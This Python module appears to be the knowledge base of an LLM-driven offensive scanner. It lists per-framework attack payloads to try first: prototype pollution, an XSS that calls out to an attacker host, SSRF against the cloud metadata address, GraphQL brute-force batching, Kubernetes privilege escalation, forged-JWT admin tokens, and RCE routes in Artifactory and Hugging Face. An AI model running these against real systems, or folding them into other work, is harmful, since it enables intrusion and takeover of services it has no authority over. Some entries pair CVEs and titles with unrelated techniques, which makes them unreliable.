"""Framework quirks corpus (Phase 5).

Per-stack curated attack knowledge — the difference between "run nuclei"
and "here's a known Express prototype-pollution bypass to try first."

Each entry in `CORPUS` has:
  - `stack`   — fingerprint match (from RECON's tech-stack detection)
  - `quirks`  — list of well-documented bug classes / CVEs / techniques
    to prioritise when this stack is present.

When the fingerprinter reports a stack, `lookup(stack)` returns the
prioritised quirks. The exploit planner uses that as retrieval-augmented
context, so the LLM sees stack-specific attacks BEFORE generic ones.

Adding a new stack = adding a dict; no code changes required.
"""
from __future__ import annotations

import logging
from typing import Any, Dict, List

logger = logging.getLogger(__name__)


CORPUS: List[Dict[str, Any]] = [
    {
        "stack": "express",
        "fingerprints": ["x-powered-by: express", "express@"],
        "quirks": [
            {
                "id": "express-proto-poll-body-parser",
                "title": "Prototype pollution via body-parser query string",
                "cve": "CVE-2022-24999",
                "technique": (
                    "Send a query string like `?constructor[prototype][a]=1` "
                    "and check whether ANY subsequent JSON response contains "
                    "the polluted key. body-parser < 1.20.1 pollutes."
                ),
                "priority": "high",
            },
            {
                "id": "express-open-redirect-res-redirect",
                "title": "Open redirect via `res.redirect(req.query.url)`",
                "technique": (
                    "Check every 302 response for `Location:` value derived "
                    "from a request parameter. Common in Express boilerplates."
                ),
                "priority": "medium",
            },
        ],
    },
    {
        "stack": "fastify",
        "fingerprints": ["fastify"],
        "quirks": [
            {
                "id": "fastify-content-type-parser",
                "title": "Fastify custom content-type parser bypasses",
                "technique": (
                    "Send `Content-Type: text/plain; charset=utf-8`, empty "
                    "body — parsers registered for `application/json` may "
                    "still run, exposing JSON-only endpoints without CSRF."
                ),
                "priority": "medium",
            },
        ],
    },
    {
        "stack": "angular",
        "fingerprints": ["ng-version", "ng-app", "angular.min.js"],
        "quirks": [
            {
                "id": "angular-sanitizer-bypass-jitless",
                "title": "Angular sanitizer bypasses in JIT-less mode",
                "technique": (
                    "Try `<img src=x onerror='fetch(\"//attacker\")'>` in "
                    "any DomSanitizer-processed field; JIT-less Angular has "
                    "known incomplete sanitisation of `srcdoc`, `formaction`."
                ),
                "priority": "medium",
            },
            {
                "id": "angular-router-fragment-injection",
                "title": "Angular router fragment injection",
                "technique": (
                    "URLs like `/x#<script>` are sometimes routed through "
                    "innerHTML in developer error pages. Worth trying on "
                    "any 404/500 branded page."
                ),
                "priority": "low",
            },
        ],
    },
    {
        "stack": "nextjs",
        "fingerprints": ["_next/static", "x-nextjs-", "next.js"],
        "quirks": [
            {
                "id": "nextjs-ssrf-next-config-images",
                "title": "SSRF via `_next/image?url=`",
                "cve": "CVE-2024-46982",
                "technique": (
                    "Try `/_next/image?url=http://169.254.169.254/&w=1&q=1`. "
                    "If Next.js's image loader isn't domain-locked, "
                    "the image endpoint fetches arbitrary URLs server-side."
                ),
                "priority": "high",
            },
        ],
    },
    {
        "stack": "django",
        "fingerprints": ["csrftoken", "django", "wsgi"],
        "quirks": [
            {
                "id": "django-admin-shell-injection",
                "title": "Django admin `?_export=csv` template-engine surface",
                "technique": (
                    "The admin's change-list export can render field values "
                    "through the template engine. Any user-controlled admin "
                    "field is an SSTI surface if `mark_safe` was used."
                ),
                "priority": "medium",
            },
        ],
    },
    {
        "stack": "rails",
        "fingerprints": ["x-runtime", "rails"],
        "quirks": [
            {
                "id": "rails-strong-params-bypass",
                "title": "Strong parameters bypass via nested hash",
                "technique": (
                    "Try `?user[admin]=true` on any create/update endpoint; "
                    "if strong-params was applied only at the top level, "
                    "nested admin flags may set."
                ),
                "priority": "medium",
            },
            {
                "id": "rails-jsonb-injection",
                "title": "JSONB field injection on where clauses",
                "cve": "CVE-2019-5418",
                "technique": (
                    "Filenames in ActionView render lookups can be manipulated "
                    "via `Accept` headers to cause file disclosure."
                ),
                "priority": "high",
            },
        ],
    },
    {
        "stack": "graphql",
        "fingerprints": ["/graphql", "graphql"],
        "quirks": [
            {
                "id": "graphql-introspection-enabled",
                "title": "GraphQL introspection enabled in production",
                "technique": (
                    "Send `{__schema{types{name fields{name}}}}` — if the "
                    "schema is returned, dump every mutation to enumerate "
                    "un-advertised write endpoints."
                ),
                "priority": "high",
            },
            {
                "id": "graphql-alias-batching-brute-force",
                "title": "Alias batching to defeat rate limits",
                "technique": (
                    "Submit a single query with 100 aliased `login` mutations. "
                    "If the endpoint counts by request rather than by field, "
                    "brute-force becomes 100x cheaper."
                ),
                "priority": "high",
            },
        ],
    },
    {
        "stack": "kubernetes",
        "fingerprints": ["kubernetes", "kubelet"],
        "quirks": [
            {
                "id": "k8s-tokenrequest-escalation",
                "title": "Kubernetes TokenRequest + kubelet escalation",
                "technique": (
                    "The July 2026 HF-incident chain: from a compromised pod, "
                    "use the pod's SA token to `POST tokenrequest` for an "
                    "elevated audience, then abuse kubelet to reach node "
                    "namespace. Test any pod SA against `kubectl auth can-i` "
                    "for `create tokenrequests`."
                ),
                "priority": "critical",
            },
        ],
    },
    {
        "stack": "artifactory",
        "fingerprints": ["jfrog artifactory", "artifactory"],
        "quirks": [
            {
                "id": "artifactory-rubygems-jruby-deser",
                "title": "Artifactory RubyGems JRuby unsandboxed deserialization",
                "cve": "CVE-2026-66384",
                "technique": (
                    "Push a RubyGem with nested-child deserialization payload; "
                    "the JRuby-backed RubyGems processing path in Artifactory "
                    "deserialises before verification. Direct RCE."
                ),
                "priority": "critical",
            },
            {
                "id": "artifactory-token-refresh-signature-forgery",
                "title": "Legacy token-refresh accepts invalid signature",
                "technique": (
                    "Present a forged admin-scoped JWT with an invalid signature "
                    "to /api/security/refresh; response was a validly-signed "
                    "admin token in the July 2026 incident."
                ),
                "priority": "critical",
            },
        ],
    },
    {
        "stack": "huggingface",
        "fingerprints": ["huggingface", "hf-", "hf_"],
        "quirks": [
            {
                "id": "hf-dataset-hdf5-disclosure",
                "title": "HDF5 external raw storage → arbitrary file disclosure",
                "technique": (
                    "Upload a dataset whose HDF5 files reference local paths via "
                    "external raw storage. The `/first-rows` preview reads and "
                    "returns those bytes. Matches July 2026 HF incident."
                ),
                "priority": "critical",
            },
            {
                "id": "hf-dataset-fsspec-jinja-rce",
                "title": "fsspec ReferenceFileSystem unsandboxed Jinja RCE",
                "technique": (
                    "Upload a ReferenceFileSystem descriptor with a Jinja SSTI "
                    "payload in a ref path. Same incident, RCE on worker."
                ),
                "priority": "critical",
            },
        ],
    },
]


def lookup(stack: str) -> List[Dict[str, Any]]:
    """Case-insensitive contains-match against every fingerprint. Returns
    the union of matching stacks' quirks, priority-sorted."""
    if not stack:
        return []
    s = str(stack).lower()
    hits: List[Dict[str, Any]] = []
    for entry in CORPUS:
        if any(fp.lower() in s for fp in entry.get("fingerprints", [])):
            hits.extend(entry.get("quirks", []))
    prio = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    hits.sort(key=lambda q: prio.get(q.get("priority", "low"), 3))
    return hits


def lookup_all(fingerprints: List[str]) -> List[Dict[str, Any]]:
    """Union of quirks across every fingerprint in the list."""
    out: List[Dict[str, Any]] = []
    seen = set()
    for fp in fingerprints or []:
        for q in lookup(fp):
            qid = q.get("id")
            if qid in seen:
                continue
            seen.add(qid)
            out.append(q)
    return out
